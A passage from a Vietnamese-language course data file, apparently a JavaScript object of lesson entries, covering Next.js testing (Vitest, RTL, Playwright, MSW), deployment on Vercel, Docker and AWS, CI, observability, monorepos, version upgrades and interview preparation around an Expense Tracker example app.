c: "Vitest là test runner nhanh, có API tương thích Jest; React Testing Library (RTL) render component và truy vấn DOM theo cách người dùng nhìn thấy (vai trò, nhãn, chữ); <code>user-event</code> mô phỏng tương tác thật như gõ phím, click, tab.",
e: "Thiết lập cho Next.js gồm <code>@vitejs/plugin-react</code>, <code>vite-tsconfig-paths</code> (để dùng alias <code>@/</code>) và môi trường <code>jsdom</code>. Thứ tự ưu tiên query của RTL: <code>getByRole</code> (kèm <code>name</code>), rồi <code>getByLabelText</code>, <code>getByPlaceholderText</code>, <code>getByText</code>, và <code>getByTestId</code> là lựa chọn cuối. Query theo role vừa giống người dùng vừa kiểm tra luôn accessibility: không tìm được nút theo role nghĩa là trình đọc màn hình cũng không tìm được. <code>getBy</code> ném lỗi khi không thấy, <code>queryBy</code> trả <code>null</code> (dùng để khẳng định phần tử không tồn tại), <code>findBy</code> chờ bất đồng bộ. Dùng <code>userEvent.setup()</code> rồi <code>await user.click()</code> thay cho <code>fireEvent</code>, vì nó phát đủ chuỗi sự kiện (pointerdown, focus, keydown...). Test hành vi, không test chi tiết cài đặt như state nội bộ hay tên class. Component dùng <code>next/navigation</code> cần mock module bằng <code>vi.mock</code>.",
x: "Test form thêm giao dịch của Expense Tracker:<pre>import { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { expect, test, vi } from 'vitest';\n\ntest('báo lỗi khi số tiền âm và không gọi submit', async () =&gt; {\n  const user = userEvent.setup();\n  const onSubmit = vi.fn();\n  render(&lt;TxForm onSubmit={onSubmit} /&gt;);\n  await user.type(screen.getByLabelText('Số tiền'), '-5');\n  await user.click(screen.getByRole('button', { name: 'Lưu' }));\n  expect(await screen.findByRole('alert')).toHaveTextContent('lớn hơn 0');\n  expect(onSubmit).not.toHaveBeenCalled();\n});</pre>Matcher <code>toHaveTextContent</code> đến từ <code>@testing-library/jest-dom</code>; import <code>@testing-library/jest-dom/vitest</code> trong file setup của Vitest."
},
"w6k6": {
c: "async Server Component là component viết dạng <code>async function</code> chạy trên server; hiện Vitest (cùng RTL) chưa hỗ trợ render loại component này, nên tài liệu Next.js khuyên kiểm thử chúng bằng E2E, còn unit test dành cho Server và Client Component đồng bộ.",
e: "RTL render bằng React DOM như ở client, trong khi async component cần môi trường React Server Components (render trên server, Suspense, RSC payload). Gọi thẳng <code>await Page()</code> rồi render kết quả đôi khi chạy được với component đơn giản, nhưng dễ vỡ khi bên trong có component async lồng nhau, <code>cookies()</code>, <code>'use cache'</code> hay Suspense, nên đó không phải cách được hỗ trợ. Chiến lược thực tế: <ul><li>Tách logic ra hàm thuần hoặc DAL (tính tổng, lọc, kiểm quyền) và unit test các hàm đó, mock DB.</li><li>Component trình bày nhận dữ liệu qua props, viết dạng đồng bộ, test bằng RTL.</li><li>Phần ghép nối (page async gọi DAL rồi render) kiểm tra bằng Playwright trên bản build thật.</li></ul>Cách tách này còn làm code dễ đọc hơn: page mỏng, logic có test riêng.",
x: "Trang <code>/dashboard</code> là async Server Component hiển thị tổng thu và chi. Thay vì cố render nó trong Vitest, tách thành ba tầng:<pre>// lib/summary.ts: hàm thuần, unit test được\nexport function summarize(txs: Tx[]) {\n  return txs.reduce(\n    (s, t) =&gt; (t.kind === 'income' ? { ...s, income: s.income + t.amount } : { ...s, expense: s.expense + t.amount }),\n    { income: 0, expense: 0 },\n  );\n}\n\n// app/(app)/dashboard/page.tsx: mỏng\nexport default async function Page() {\n  const txs = await listMyTx(currentMonth());\n  return &lt;SummaryCards {...summarize(txs)} /&gt;; // SummaryCards đồng bộ, test bằng RTL\n}\n// e2e/dashboard.spec.ts\nawait expect(page.getByRole('heading', { name: 'Tổng chi' })).toBeVisible();</pre><code>summarize</code> test bằng Vitest, <code>SummaryCards</code> bằng Vitest + RTL, còn trang thật bằng Playwright."
},
"w6k7": {
c: "Playwright là framework E2E điều khiển trình duyệt thật (Chromium, Firefox, WebKit); locator là cách tìm phần tử có tự chờ (auto-wait) và tự thử lại, còn <code>page.route()</code> cho phép chặn và mock request mạng.",
e: "<ul><li><b>Locator</b>: ưu tiên <code>getByRole</code>, <code>getByLabel</code>, <code>getByText</code>, tránh selector CSS hoặc XPath dài. Assertion kiểu web-first (<code>await expect(locator).toBeVisible()</code>) tự chờ tới khi điều kiện đúng hoặc hết timeout, nên không cần <code>waitForTimeout</code>.</li><li><b>Mock network</b>: <code>page.route('**/api/fx*', (r) =&gt; r.fulfill({ json }))</code> chỉ chặn được request phát ra từ trình duyệt. Request do Server Component gọi từ server thì Playwright không thấy; phải mock ở phía server (MSW) hoặc dùng môi trường test riêng.</li><li><b>Đăng nhập</b>: login một lần trong setup project, lưu <code>storageState</code> rồi dùng lại cho các test sau.</li></ul>Chạy trên <code>next build</code> + <code>next start</code> (qua cấu hình <code>webServer</code>) để giống production. Với Cache Components, gói <code>@next/playwright</code> có helper <code>instant()</code> để khẳng định UI hiện ngay khi điều hướng. Mỗi test tự tạo dữ liệu riêng để chạy song song không đụng nhau; bật trace khi retry để dễ debug trên CI.",
x: "Lab tuần 6: luồng đăng nhập rồi thêm giao dịch:<pre>// e2e/add-tx.spec.ts\nimport { test, expect } from '@playwright/test';\ntest.use({ storageState: 'e2e/.auth/user.json' }); // tạo trong auth.setup.ts\n\ntest('thêm giao dịch mới hiện trong danh sách', async ({ page }) =&gt; {\n  await page.route('**/api/fx**', (r) =&gt; r.fulfill({ json: { rate: 25000 } }));\n  await page.goto('/transactions');\n  await page.getByRole('button', { name: 'Thêm giao dịch' }).click();\n  await page.getByLabel('Số tiền').fill('45000');\n  await page.getByLabel('Ghi chú').fill('Cà phê e2e');\n  await page.getByRole('button', { name: 'Lưu' }).click();\n  await expect(page.getByRole('row', { name: /Cà phê e2e/ })).toBeVisible();\n});</pre>File <code>auth.setup.ts</code> điền form login một lần rồi gọi <code>page.context().storageState({ path })</code> để lưu cookie phiên."
},
"w6k8": {
c: "MSW (Mock Service Worker) là thư viện mock API ở tầng mạng: định nghĩa handler cho request (REST, GraphQL) một lần và dùng lại được trong unit test chạy trên Node, trong trình duyệt (qua Service Worker), trong Storybook và E2E.",
e: "Khác với mock module (<code>vi.mock('./api')</code>), MSW chặn request thật ở tầng <code>fetch</code>, nên code ứng dụng chạy nguyên vẹn, kể cả phần xử lý header, status code và lỗi parse. Trên Node dùng <code>setupServer(...handlers)</code> từ <code>msw/node</code>: gọi <code>listen</code> trước tất cả test, <code>resetHandlers</code> sau mỗi test, <code>close</code> ở cuối; đặt <code>onUnhandledRequest: 'error'</code> để không vô tình gọi API thật. Ghi đè trong từng test bằng <code>server.use(...)</code> cho các trường hợp lỗi 500, phản hồi chậm, dữ liệu rỗng. Trong trình duyệt dùng <code>setupWorker</code> từ <code>msw/browser</code> (cần file worker trong <code>public/</code>) cho môi trường dev và Storybook. Với Next.js, request từ Server Component chạy trong process Node của server; có thể bật MSW server trong <code>instrumentation.ts</code> ở môi trường test để E2E thấy dữ liệu mock, nhưng cách này phức tạp hơn, nên nhiều team dùng API giả hoặc DB test riêng cho E2E.",
x: "Test component <code>FxBadge</code> của Expense Tracker, gồm cả trường hợp API tỷ giá lỗi:<pre>// test/msw.ts (nạp trong file setup)\nimport { http, HttpResponse } from 'msw';\nimport { setupServer } from 'msw/node';\nexport const server = setupServer(http.get('https://fx.example.com/rate', () =&gt; HttpResponse.json({ rate: 25000 })));\nbeforeAll(() =&gt; server.listen({ onUnhandledRequest: 'error' }));\nafterEach(() =&gt; server.resetHandlers());\nafterAll(() =&gt; server.close());\n\n// fx-badge.test.tsx\ntest('hiện thông báo khi API lỗi', async () =&gt; {\n  server.use(http.get('https://fx.example.com/rate', () =&gt; new HttpResponse(null, { status: 503 })));\n  render(&lt;FxBadge /&gt;);\n  expect(await screen.findByText('Không lấy được tỷ giá')).toBeInTheDocument();\n});</pre>Cùng bộ handler này có thể dùng cho Storybook để designer xem trạng thái lỗi mà không cần backend."
},
"w7k0": {
c: "Vercel là nền tảng hosting do đội phát triển Next.js xây dựng, biến mỗi lần deploy thành một bản bất biến; các tính năng chính gồm preview deployment cho mỗi branch hoặc PR, các môi trường tách biệt, instant rollback và skew protection.",
e: "<ul><li><b>Preview deployment</b>: mỗi lần push lên branch có một URL riêng để QA, designer, PM xem và comment; dùng biến môi trường của Preview (DB staging, key test) và có thể bảo vệ bằng mật khẩu hoặc SSO.</li><li><b>Environment</b>: Production, Preview, Development (kéo biến về máy bằng <code>vercel env pull</code>), và môi trường tùy chỉnh như staging. Đổi biến <code>NEXT_PUBLIC_</code> phải redeploy vì giá trị đã được inline lúc build.</li><li><b>Instant rollback</b>: trỏ domain production về một bản deploy trước gần như tức thì, không build lại; dùng khi có sự cố, nhưng nhớ rằng rollback code không đảo ngược migration DB.</li><li><b>Skew protection</b>: client đang mở bản cũ vẫn được phục vụ asset và Server Action của đúng bản đó trong một khoảng thời gian sau khi có bản mới, tránh lỗi “Failed to find Server Action” hay chunk JS 404.</li></ul>Khi tự host, bạn phải tự làm các phần tương đương, ví dụ cấu hình <code>deploymentId</code> để xử lý version skew.",
x: "Bản deploy chiều thứ Sáu làm báo cáo tháng của Expense Tracker tính sai. Quy trình xử lý: bấm Instant Rollback về bản trước trong dashboard Vercel (mất vài giây), xác nhận lỗi biến mất qua log, rồi mới điều tra trên preview deployment của commit lỗi. Postmortem bổ sung hai việc: test cho hàm tính báo cáo, và quy ước migration DB tương thích ngược (thêm cột trước, xóa cột ở lần deploy sau) để rollback code không làm vỡ dữ liệu. Câu hỏi đi kèm: “Vì sao người đang mở tab cũ không bị lỗi khi bạn deploy?” Trả lời: skew protection giữ asset và action ID của bản cũ; còn khi tự host thì cần <code>deploymentId</code> để Next.js phát hiện lệch phiên bản và tải lại trang."
},
"w7k1": {
c: "Tự host Next.js là chạy <code>next start</code> trên server hoặc container của bạn; <code>output: 'standalone'</code> tạo thư mục <code>.next/standalone</code> chứa <code>server.js</code> và chỉ những file trong <code>node_modules</code> thực sự cần, giúp image Docker nhỏ gọn.",
e: "Chạy dạng Node server hoặc Docker hỗ trợ đầy đủ tính năng (Cache Components, ISR, tối ưu ảnh, proxy). Những điểm cần biết: <ul><li><b>Standalone</b> không copy <code>public/</code> và <code>.next/static</code>; phải tự copy hoặc phục vụ chúng qua CDN. Chạy bằng <code>node server.js</code>, dùng user không phải root, đặt <code>HOSTNAME=0.0.0.0</code>.</li><li><b>Nhiều instance</b>: cache mặc định nằm trong bộ nhớ hoặc đĩa của từng instance, nên <code>revalidateTag</code> ở instance A không ảnh hưởng instance B. Cấu hình <code>cacheHandlers</code> (cho <code>'use cache'</code>, triển khai <code>refreshTags</code> để đồng bộ tag) và <code>cacheHandler</code> (cho ISR và fetch cache) dùng Redis; mọi instance dùng chung <code>NEXT_SERVER_ACTIONS_ENCRYPTION_KEY</code> (đặt lúc build) và cùng <code>deploymentId</code>.</li><li><b>Hạ tầng</b>: đặt reverse proxy (nginx) phía trước và tắt buffering để streaming hoạt động; tối ưu ảnh tốn CPU; xử lý SIGTERM để request đang chạy và <code>after()</code> kịp hoàn tất.</li></ul>",
x: "Dockerfile multi-stage cho Expense Tracker (đã đặt <code>output: 'standalone'</code> trong <code>next.config.ts</code>):<pre>FROM node:22-alpine AS build\nWORKDIR /app\nCOPY package.json pnpm-lock.yaml ./\nRUN corepack enable &amp;&amp; pnpm install --frozen-lockfile\nCOPY . .\nRUN pnpm build\n\nFROM node:22-alpine\nWORKDIR /app\nENV NODE_ENV=production HOSTNAME=0.0.0.0 PORT=3000\nCOPY --from=build --chown=node:node /app/.next/standalone ./\nCOPY --from=build --chown=node:node /app/.next/static ./.next/static\nCOPY --from=build --chown=node:node /app/public ./public\nUSER node\nCMD [&quot;node&quot;, &quot;server.js&quot;]</pre>Khi chạy 3 replica trên Kubernetes, thêm cache handler dùng Redis, truyền <code>NEXT_SERVER_ACTIONS_ENCRYPTION_KEY</code> vào bước build và đặt <code>deploymentId</code> theo git SHA."
},
"w7k2": {
c: "Adapters API (Deployment Adapter API) là API chính thức để nền tảng hosting can thiệp vào quá trình build của Next.js (<code>modifyConfig</code>, <code>onBuildComplete</code>) và nhận output đã được phân loại để triển khai; OpenNext là dự án mã nguồn mở chuyển output Next.js sang dạng chạy được trên AWS và Cloudflare Workers.",
e: "Trước đây, mỗi nhà cung cấp phải tự đọc cấu trúc nội bộ của thư mục <code>.next</code>, dễ vỡ mỗi khi Next.js đổi phiên bản. Adapters API ra mắt bản alpha ở 16.0; từ 16.2, <code>adapterPath</code> thành tùy chọn ổn định ở cấp cao nhất của config. Adapter nhận danh sách output (function Node hoặc Edge, asset tĩnh, trang prerender) cùng thông tin routing để ánh xạ sang hạ tầng của mình; docs có cả hướng dẫn hỗ trợ PPR. Adapter “verified” là adapter chạy toàn bộ bộ test tương thích của Next.js: hiện có Vercel và Bun. Cloudflare và Netlify đang xây adapter trên API này, trong lúc chờ vẫn dùng tích hợp riêng (của Cloudflare dựa trên OpenNext, gói <code>@opennextjs/cloudflare</code>). Trên AWS, <code>@opennextjs/aws</code> (thường dùng qua SST) là lựa chọn phổ biến. Khi đánh giá nền tảng, hãy hỏi: có hỗ trợ streaming, Cache Components/PPR, cache dùng chung, tối ưu ảnh, skew protection không, hay mình phải tự bù.",
x: "Công ty yêu cầu Expense Tracker chạy trong tài khoản AWS riêng vì dữ liệu tài chính. Hai phương án để trình bày khi phỏng vấn:<ul><li><b>Container</b>: <code>output: 'standalone'</code> trên ECS/Fargate sau ALB, CloudFront phía trước, Redis (ElastiCache) cho <code>cacheHandlers</code>. Đơn giản, đủ tính năng, nhưng trả tiền cho máy chạy liên tục; cần kiểm tra ALB không buffer streaming.</li><li><b>Serverless</b>: OpenNext AWS qua SST (Lambda, CloudFront, S3, cùng DynamoDB và SQS cho revalidation). Rẻ khi ít traffic, tự scale, nhưng có cold start và nhiều thành phần cần vận hành hơn.</li></ul>Nếu chọn Cloudflare Workers thì dùng <code>@opennextjs/cloudflare</code> và kiểm tra các thư viện Node đang dùng có chạy được trên runtime Workers không. Nên theo dõi danh sách verified adapter trên docs vì nó đang mở rộng."
},
"w7k3": {
c: "CI (Continuous Integration) là pipeline tự động chạy mỗi khi có push hoặc PR để kiểm tra code: lint, typecheck, unit test, build và E2E; GitHub Actions là nơi chạy phổ biến, và cache dependency cùng kết quả build giúp pipeline chạy nhanh.",
e: "Thứ tự hợp lý: cài dependency (có cache), rồi chạy lint (ESLint hoặc Biome; Next.js 16 đã bỏ <code>next lint</code> và <code>next build</code> không còn tự lint), <code>tsc --noEmit</code> và Vitest, sau đó <code>next build</code>, cuối cùng Playwright chạy trên bản build. <b>Cache</b>: store của pnpm qua <code>actions/setup-node</code> với <code>cache: pnpm</code>; thư mục <code>.next/cache</code> qua <code>actions/cache</code> với key theo lockfile và hash source; trình duyệt Playwright theo phiên bản. Dùng <code>concurrency</code> để hủy run cũ của cùng một PR, tách job chạy song song, chia Playwright thành nhiều shard khi số test lớn. Upload report và trace khi test fail. Secret đặt trong GitHub Secrets hoặc Environments, không in ra log. Bật branch protection để PR chỉ merge được khi mọi check xanh. Pipeline chậm quá 10 phút thì mọi người sẽ tìm cách bỏ qua nó.",
x: "Workflow cho PR của Expense Tracker:<pre>on: pull_request\njobs:\n  ci:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: pnpm/action-setup@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: 22, cache: pnpm }\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm lint &amp;&amp; pnpm typecheck &amp;&amp; pnpm test --run\n      - run: pnpm build\n      - run: pnpm exec playwright install --with-deps chromium &amp;&amp; pnpm exec playwright test</pre>Thêm khối <code>concurrency</code> (group theo <code>github.ref</code>, <code>cancel-in-progress: true</code>) và một bước <code>actions/cache</code> cho <code>.next/cache</code> trước bước build. Preview deploy do Vercel tự tạo khi PR mở; merge vào <code>main</code> thì deploy production."
},
"w7k4": {
c: "<code>instrumentation.ts</code> là file ở gốc project (hoặc trong <code>src/</code>) mà Next.js gọi hàm <code>register()</code> của nó một lần khi server khởi động, và gọi <code>onRequestError</code> mỗi khi có lỗi phía server; đây là điểm gắn OpenTelemetry, Sentry hay công cụ observability khác.",
e: "<ul><li><b>register()</b>: khởi tạo SDK theo runtime; kiểm tra <code>process.env.NEXT_RUNTIME === 'nodejs'</code> trước khi import thư viện chỉ chạy trên Node.</li><li><b>onRequestError(err, request, context)</b>: nhận lỗi từ Server Component, Route Handler, Server Action và proxy, kèm đường dẫn, loại route và kiểu render, để gửi lên hệ thống theo dõi lỗi.</li><li><b>OpenTelemetry</b>: chuẩn mở cho trace, metric, log. <code>@vercel/otel</code> với <code>registerOTel({ serviceName })</code> là cách nhanh nhất; Next.js tự tạo span cho request, render, fetch; dữ liệu xuất sang Jaeger, Grafana Tempo, Datadog...</li><li><b>Sentry</b>: SDK <code>@sentry/nextjs</code> gắn ở <code>instrumentation.ts</code> (server) và <code>instrumentation-client.ts</code> (client), export <code>onRequestError = Sentry.captureRequestError</code>, upload source map lúc build.</li></ul>Ở client, <code>error.tsx</code> và <code>global-error.tsx</code> gửi lỗi lên Sentry. Log nên có cấu trúc (JSON) kèm request id; đặt cảnh báo theo tỷ lệ lỗi và p95 latency. Ở production, <code>error.message</code> của lỗi server bị ẩn với client; dùng <code>error.digest</code> để đối chiếu với log.",
x: "Expense Tracker gặp lỗi “Xuất báo cáo thất bại” ở một số ít user. Người dùng chỉ thấy mã digest; nhờ <code>onRequestError</code> gửi lỗi kèm digest và route lên Sentry, team tìm ra ngay stack trace: một giao dịch có <code>note</code> bằng null làm hàm format bị lỗi.<pre>// instrumentation.ts\nimport * as Sentry from '@sentry/nextjs';\nimport { registerOTel } from '@vercel/otel';\n\nexport async function register() {\n  registerOTel({ serviceName: 'expense-tracker' });\n  if (process.env.NEXT_RUNTIME === 'nodejs') await import('./sentry.server.config');\n}\n\nexport const onRequestError = Sentry.captureRequestError;</pre>Trace OpenTelemetry còn cho thấy trang chậm vì truy vấn <code>getMonthlySummary</code> mất 900 ms, từ đó mới có căn cứ để cache nó bằng <code>'use cache'</code>."
},
"w7k5": {
c: "Monorepo là một repository chứa nhiều app và package liên quan; pnpm workspace quản lý dependency và liên kết các package nội bộ, còn Turborepo điều phối việc chạy task (build, test, lint) theo đồ thị phụ thuộc, chỉ chạy lại phần thay đổi và cache kết quả.",
e: "<ul><li><b>pnpm workspace</b>: khai báo trong <code>pnpm-workspace.yaml</code> (ví dụ <code>apps/*</code>, <code>packages/*</code>); package nội bộ được tham chiếu bằng giao thức <code>workspace:*</code>; cả repo dùng một lockfile, cài nhanh nhờ store dùng chung.</li><li><b>Turborepo</b>: <code>turbo.json</code> khai báo <code>tasks</code>; <code>dependsOn: ['^build']</code> nghĩa là build các package phụ thuộc trước; <code>outputs</code> (ví dụ <code>.next/**</code> trừ <code>.next/cache/**</code>) quyết định thứ được cache; <code>turbo run build --affected</code> chỉ chạy các package bị ảnh hưởng; remote cache chia sẻ kết quả giữa máy dev và CI.</li><li><b>Với Next.js</b>: tách package UI và config dùng chung (<code>packages/ui</code>, <code>packages/eslint-config</code>, <code>packages/tsconfig</code>); package viết TypeScript mà chưa build sẵn thì khai báo trong <code>transpilePackages</code>.</li></ul>Lợi ích: chia sẻ code và type giữa web, admin, API; sửa một chỗ là thấy lỗi ở mọi nơi dùng nó. Chi phí: CI và công cụ phức tạp hơn, cần quy ước rõ ai sở hữu package nào.",
x: "Expense Tracker mở rộng thành monorepo: app web, app admin nội bộ, cùng package <code>@et/ui</code> và <code>@et/schemas</code> (schema zod dùng chung với backend Node):<pre>// pnpm-workspace.yaml\npackages: ['apps/*', 'packages/*']\n\n// turbo.json\n{\n  &quot;tasks&quot;: {\n    &quot;build&quot;: { &quot;dependsOn&quot;: [&quot;^build&quot;], &quot;outputs&quot;: [&quot;.next/**&quot;, &quot;!.next/cache/**&quot;, &quot;dist/**&quot;] },\n    &quot;test&quot;: { &quot;dependsOn&quot;: [&quot;^build&quot;] },\n    &quot;lint&quot;: {}\n  }\n}\n\n// apps/web/next.config.ts\nconst nextConfig: NextConfig = { transpilePackages: ['@et/ui', '@et/schemas'] };</pre>Trên CI chạy <code>pnpm turbo run lint test build --affected</code>: PR chỉ sửa app admin thì app web không bị build lại."
},
"w7k6": {
c: "Nâng cấp phiên bản Next.js là một quy trình có kiểm soát: đọc upgrade guide, chạy codemod để sửa tự động các thay đổi cơ học, xử lý phần breaking change còn lại, rồi kiểm chứng; từ 16.4 có thêm <code>next upgrade --agent</code> chuẩn bị hướng dẫn, codemod và bước kiểm tra đúng phiên bản cho coding agent.",
e: "<ul><li><b>Codemod</b>: <code>npx @next/codemod@canary upgrade latest</code> cập nhật package, chuyển cấu hình sang key <code>turbopack</code>, chuyển <code>next lint</code> sang ESLint CLI, đổi <code>middleware</code> thành <code>proxy</code>, bỏ tiền tố <code>unstable_</code>. Truy cập đồng bộ <code>params</code>, <code>cookies()</code> cần chạy thêm codemod <code>next-async-request-api</code>.</li><li><b>Agent</b>: <code>npx next@canary upgrade --agent=latest</code> kiểm tra phiên bản hiện tại, chọn đích, chuẩn bị migration guide, codemod và bước kiểm chứng cho agent; <code>experimental.agentUpgrade</code> nhắc khi có bản vá bảo mật. Người vẫn phải review diff.</li><li><b>Cache Components</b> là bước riêng, làm sau khi đã chạy ổn trên 16: bật <code>cacheComponents</code> trên nhánh riêng, xóa <code>dynamic</code>, <code>revalidate</code>, <code>fetchCache</code>, rồi làm theo cảnh báo của dev overlay để thêm Suspense hoặc <code>'use cache'</code>. Có thể đi từng route bằng <code>export const instant = false</code> (codemod <code>cache-components-instant-false</code>) rồi gỡ dần.</li></ul>Build xanh chưa đủ: chạy E2E và kiểm tra hành vi cache, prefetch, state UI (route cũ được giữ bằng <code>&lt;Activity&gt;</code>).",
x: "Kế hoạch nâng Expense Tracker từ 15.5 lên 16.4, trình bày khi phỏng vấn:<ol><li>PR 1: chạy codemod upgrade và async request API, đổi sang <code>proxy.ts</code>, thêm <code>default.tsx</code> cho slot <code>@modal</code>, sửa <code>revalidateTag(tag, 'max')</code>, sửa script lint. CI xanh thì deploy và theo dõi hai ngày.</li><li>PR 2: bật <code>cacheComponents</code> và <code>partialPrefetching</code>, chạy codemod <code>instant = false</code> để app vẫn build được.</li><li>PR 3 trở đi: mỗi PR một khu vực (dashboard, transactions, reports): gỡ <code>instant = false</code>, thêm Suspense hoặc <code>'use cache'</code>, viết test <code>instant()</code>, đo lại LCP và chi phí server.</li></ol>Khi dùng agent, giới hạn phạm vi mỗi lần và đọc kỹ diff: agent hay sinh API cũ (ví dụ <code>revalidateTag</code> một tham số) nếu <code>AGENTS.md</code> không trỏ tới docs đúng phiên bản."
},
"w7k7": {
c: "Frontend system design là dạng câu phỏng vấn yêu cầu thiết kế kiến trúc phía frontend cho một tính năng: làm rõ yêu cầu, mô hình dữ liệu, nơi render và nơi đặt state, caching, hiệu năng, bảo mật, đo lường, và giải thích các đánh đổi.",
e: "Khung trả lời: làm rõ yêu cầu (người dùng, quy mô, SEO, realtime, thiết bị), rồi API và mô hình dữ liệu, kiến trúc render (phần nào tĩnh, phần nào cache, phần nào động), state đặt ở đâu, hiệu năng, accessibility, bảo mật, cuối cùng là đo lường và rủi ro. Ba đề hay gặp: <ul><li><b>Listing có filter</b>: filter trong URL; static shell + Suspense cho kết quả; <code>'use cache'</code> theo chiều filter có ít giá trị, lọc phần còn lại trong bộ nhớ; phân trang cursor; canonical cho SEO; debounce ô tìm kiếm và virtualize danh sách.</li><li><b>Dashboard realtime</b>: shell và số liệu tổng hợp render ở server; luồng realtime (WebSocket hoặc SSE) xử lý trong Client Component, cập nhật vào cache của TanStack Query hoặc store; reconnect có backoff; gom cập nhật theo nhịp thay vì render mỗi message; biểu đồ lazy load.</li><li><b>Auth với backend riêng</b>: Next.js làm BFF, token nằm trong cookie httpOnly, refresh ở server, DAL gọi API kèm token, proxy chỉ làm optimistic check, xử lý CSRF, logout xóa phiên ở cả hai phía.</li></ul>",
x: "Đề: “Thiết kế màn hình giao dịch cho app ví có 2 triệu user, mỗi user có tới 50.000 giao dịch”. Hướng trả lời ngắn gọn:<ul><li>URL: <code>/transactions?month=&amp;cat=&amp;q=&amp;cursor=</code>; Server Component đọc và validate.</li><li>Render: header, sidebar, bộ lọc nằm trong static shell; bảng kết quả trong Suspense với skeleton có chiều cao cố định.</li><li>Dữ liệu: dữ liệu cá nhân nên không cache chung; tổng tháng cache theo <code>userId</code> và tháng kèm <code>cacheTag</code>; <code>updateTag</code> khi user thêm giao dịch, <code>revalidateTag</code> khi webhook ngân hàng về.</li><li>Client: ô tìm kiếm debounce rồi cập nhật URL; bảng virtualize; xuất file bằng dynamic import.</li><li>Bảo mật: mọi truy vấn đi qua DAL và lọc theo <code>userId</code>; rate limit cho chức năng xuất.</li><li>Đo lường: INP của ô lọc, p95 thời gian truy vấn, tỷ lệ cache hit.</li></ul>Kết thúc bằng một đánh đổi: phân trang cursor không nhảy được tới trang bất kỳ, đổi lại kết quả ổn định khi có giao dịch mới chen vào."
},
"w7k8": {
c: "Đây là phần chuẩn bị cuối: dùng AI coding tool (Cursor, Copilot, Claude Code, Codex) một cách có kiểm soát, kể kinh nghiệm theo cấu trúc STAR (Situation, Task, Action, Result), luyện phỏng vấn thử và luyện các bài live coding hay gặp.",
e: "<ul><li><b>AI có kiểm soát</b>: giao việc có phạm vi rõ (viết test, chạy migration, dựng khung), cung cấp docs đúng phiên bản (Next.js 16 có <code>AGENTS.md</code> trỏ tới docs đi kèm trong <code>node_modules/next/dist/docs</code>), đọc kỹ diff và chạy test; không dán secret hay code của khách hàng vào công cụ chưa được phép. Model hay sinh API cũ (<code>getServerSideProps</code>, <code>params</code> đồng bộ, <code>middleware.ts</code>), bạn phải nhận ra được.</li><li><b>STAR</b>: S và T ngắn (một hai câu); A chiếm phần lớn thời gian và nói rõ “tôi” đã làm gì; R có số liệu (LCP giảm từ 3,4 s xuống 1,9 s, lỗi giảm 40%). Chuẩn bị sẵn 5–6 câu chuyện: dự án tự hào nhất, sự cố production, bất đồng kỹ thuật, mentor người khác, deadline gấp, một lần thất bại.</li><li><b>Mock interview</b>: ghi âm, nói to suy nghĩ của mình, giới hạn thời gian như thật.</li><li><b>Live coding</b>: luyện tới mức viết được không cần tra, ví dụ debounce, throttle, <code>Promise.all</code>, retry có backoff, deep equal, hook fetch có hủy request, component autocomplete hoặc danh sách cuộn vô hạn.</li></ul>",
x: "Câu “Bạn dùng AI coding tool trong dự án thế nào?” trả lời theo STAR dựa trên Expense Tracker:<ul><li><b>S</b>: cần nâng app từ Next.js 15 lên 16 trong một sprint, khoảng 40 route.</li><li><b>T</b>: tôi phụ trách migration mà không làm chậm các tính năng đang phát triển.</li><li><b>A</b>: chạy codemod trước; dùng Claude Code với <code>AGENTS.md</code> trỏ tới docs của bản 16 để sửa những chỗ codemod để lại; chia PR theo khu vực; review từng diff và bắt được hai lỗi của agent: đọc <code>cookies()</code> bên trong hàm <code>'use cache'</code> và gọi <code>revalidateTag</code> một tham số; bổ sung test Playwright cho 5 luồng chính trước khi merge.</li><li><b>R</b>: xong trong 6 ngày thay vì 2 tuần như ước tính, không có sự cố production, TTFB dashboard giảm 35% sau khi chuyển một phần sang Cache Components.</li></ul>Điều người phỏng vấn muốn nghe: bạn vẫn chịu trách nhiệm với code, biết khi nào AI sai và có quy trình kiểm chứng."
}
};
